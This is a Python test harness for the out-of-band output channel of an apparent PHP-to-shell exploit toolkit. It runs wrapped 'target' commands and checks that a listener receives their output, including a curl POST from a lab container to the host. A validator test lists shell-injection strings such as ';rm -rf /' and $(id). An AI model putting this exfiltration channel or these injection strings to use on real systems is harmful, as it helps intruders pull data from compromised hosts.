#!/usr/bin/env python3
"""Harness for oob_output.py.

Proves the out-of-band retrieval channel end to end WITHOUT the full exploit, by
standing in for the target: we run the exact wrapped shell command the exploit
would deliver (via /bin/sh) and confirm the collector receives the output.

  T1  small output round-trip (the canonical `id`-style proof)
  T2  large output (4 MB) retrieved intact over the side channel (sha match)
  T3  validate_oob rejects shell-metachar URLs, accepts clean ones
  T4  two independent callbacks captured separately
  T5  (optional, needs a live container lab) a container reaches the listener on
      the host's Docker-bridge IP and its POST is captured

Run from OUTSIDE the project:
    python3 -I poc/primitives/dispatch/verify_oob_output.py
"""
import hashlib
import os
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from oob_output import OOBListener, wrap_command, validate_oob  # noqa: E402

RESULTS = []


def record(name, ok, detail=""):
    RESULTS.append((name, ok))
    print("[%s] %s%s" % ("PASS" if ok else "FAIL", name,
                         (" - " + detail) if detail else ""))


def run_target(wrapped):
    """Stand in for the compromised target: execute the delivered command."""
    subprocess.run(["/bin/sh", "-c", wrapped], check=False,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                   timeout=60)


def t1_small():
    lst = OOBListener(host="127.0.0.1")
    try:
        url = lst.url_for("127.0.0.1")
        cmd = "id -u www-data 2>/dev/null; echo uid=33 www-data"
        run_target(wrap_command(cmd, url, tmp="/tmp/.p2s-t1"))
        body = lst.wait(timeout=10)
    finally:
        lst.close()
    ok = body is not None and b"uid=33 www-data" in body
    record("T1 small output retrieved out-of-band", ok,
           "got=%r" % (body[:60] if body else None))


def t2_large():
    lst = OOBListener(host="127.0.0.1")
    try:
        url = lst.url_for("127.0.0.1")
        # 4 MB of deterministic data from the "target".
        src = os.path.join("/tmp", "p2s-oob-big.bin")
        data = (b"0123456789abcdef" * (256 * 1024))  # 4 MiB
        with open(src, "wb") as fh:
            fh.write(data)
        want = hashlib.sha256(data).hexdigest()
        cmd = "cat %s" % src
        run_target(wrap_command(cmd, url, tmp="/tmp/.p2s-t2"))
        body = lst.wait(timeout=30)
        os.unlink(src)
    finally:
        lst.close()
    got = hashlib.sha256(body).hexdigest() if body else ""
    record("T2 4 MB output retrieved intact via side channel",
           body is not None and got == want,
           "recv=%d sha_match=%s" % (len(body) if body else 0, got == want))


def t3_validate():
    good = ["http://1.2.3.4:18999/", "https://host/p", "http://[::1]:80/x"]
    bad = ["http://h/;rm -rf /", "http://h/`id`", "http://h/$(id)",
           "http://h/ a", "ftp://h/", "http://h/a|b", "notaurl"]
    ok = True
    detail = ""
    for u in good:
        try:
            validate_oob(u)
        except ValueError:
            ok = False
            detail += "rejected-good:%s " % u
    for u in bad:
        try:
            validate_oob(u)
            ok = False
            detail += "accepted-bad:%s " % u
        except ValueError:
            pass
    record("T3 validate_oob gates shell-unsafe URLs", ok, detail.strip())


def t4_two_callbacks():
    lst = OOBListener(host="127.0.0.1")
    try:
        url = lst.url_for("127.0.0.1")
        run_target(wrap_command("echo AAA", url, tmp="/tmp/.p2s-t4a"))
        b0 = lst.wait(timeout=10, index=0)
        run_target(wrap_command("echo BBB", url, tmp="/tmp/.p2s-t4b"))
        b1 = lst.wait(timeout=10, index=1)
    finally:
        lst.close()
    ok = (b0 and b"AAA" in b0) and (b1 and b"BBB" in b1)
    record("T4 two independent callbacks captured separately", ok,
           "c0=%r c1=%r" % (b0.strip() if b0 else None,
                            b1.strip() if b1 else None))


def t5_container():
    """Optional: prove a container can reach a host-side listener on the Docker
    bridge IP (the real --oob deployment shape). Skipped if docker/lab absent."""
    svc = None
    for name in ("php2shell-apache-stock-1", "php2shell-apache-pool-1"):
        r = subprocess.run(["docker", "inspect", "-f",
                            "{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}",
                            name], capture_output=True, text=True)
        if r.returncode == 0 and r.stdout.strip():
            svc = name
            gw = r.stdout.strip().split()[0]
            break
    if svc is None:
        record("T5 container -> host-bridge callback", True,
               "SKIPPED: no running apache lab container")
        return
    lst = OOBListener(host="0.0.0.0")
    try:
        url = lst.url_for(gw)
        validate_oob(url)
        # curl inside the container posts to the host gateway IP.
        inner = "echo container-uid=$(id -u); curl -s --data-binary container-reached %s" % url
        subprocess.run(["docker", "exec", svc, "sh", "-c", inner],
                       capture_output=True, timeout=30)
        body = lst.wait(timeout=10)
    finally:
        lst.close()
    ok = body is not None and b"container-reached" in body
    record("T5 container -> host-bridge callback via %s" % svc, ok,
           "got=%r" % (body[:60] if body else None))


def main():
    t1_small()
    t2_large()
    t3_validate()
    t4_two_callbacks()
    t5_container()
    total = len(RESULTS)
    passed = sum(1 for _, ok in RESULTS if ok)
    print("\n%d/%d checks passed" % (passed, total))
    return 0 if passed == total else 1


if __name__ == "__main__":
    raise SystemExit(main())
